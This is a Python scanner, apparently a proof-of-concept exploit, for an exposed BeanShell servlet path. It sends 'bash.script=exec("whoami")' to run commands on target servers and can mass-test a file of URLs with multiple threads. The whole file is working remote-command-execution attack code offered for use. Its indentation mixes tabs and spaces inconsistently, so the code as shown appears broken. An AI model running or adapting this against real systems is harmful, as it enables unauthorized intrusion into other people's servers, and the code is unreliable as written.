#!/usr/bin/env python3
# -*- coding: utf-8 -*

"""
@Author: Noel
@Email: noleisfresher@163.com
@LastEditors: 2021/10/21
@Date: 2021/10/21
@LastEditTime: 2021/10/21
"""
# ---------------------------------------------------------

import requests
import sys
import threading
import argparse
from queue import Queue


PATH = '/servlet/~ic/bsh.servlet.BshServlet'
GREEN = "\033[0;32;40m"
END = "\033[0m"
DATA = 'bash.script=exec("whoami")'


def parser_args():
	parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " -u http://www.vulnsite.com")
	parser.add_argument("-u","--url", help="Target url")
	parser.add_argument("-f", "--file", help="The file contains test urls")
	parser.add_argument("-t", "--thread", help="How many threads to run.Default 5")
	return parser.parse_args()


def poc(url):
	poc_url = url + PATH
	try:
		response = requests.get(url=poc_url, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
				}
		)
		if response.status_code == 200 and 'BeanShell' in response.text:
			exp(poc_url)
		else:
			print(f"[-] {poc_url} is not vulnerable...")
	except :
		pass

def exp(url):
	try:
		response = requests.post(url=url, headers={
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
              "Content-Type": "application/x-www-form-urlencoded"
                  }, data=DATA)
        if response.status_code == 200 and "trying to resolve variable" not in response.text:
            print(GREEN + f"[+] {url} is vulnerable" + END)
	except :
        pass

def one_target(url):
	poc(url)


def file_target(filename):
	file_obj = open(filename, "r", encoding="utf-8")
	urls_contens = file_obj.readlines()
	url_queue = Queue()
	for url in urls_contens:
		url_queue.put(url.strip())
	file_obj.close()

	return url_queue

def thread_run(queue):
	while not queue.empty():
		poc_url = queue.get()
		poc(poc_url)


if __name__ == '__main__':
	args = parser_args()
	if args.file == None and args.url == None:
		sys.exit("Use -h to show more options")
	elif args.url != None and args.file == None:
		url = args.url
		one_target(url)
	elif args.url == None and args.file != None:
		filename = args.file
		url_queue = file_target(filename)
		THREAD_NUM = args.thread if args.thread != None else 5
		thread_mission = []
		for i in range(int(THREAD_NUM)):
			t = threading.Thread(target=thread_run, args=(url_queue,))
			thread_mission.append(t)
			t.start()
		for i in thread_mission:
			i.join()
		print("探测完毕!!")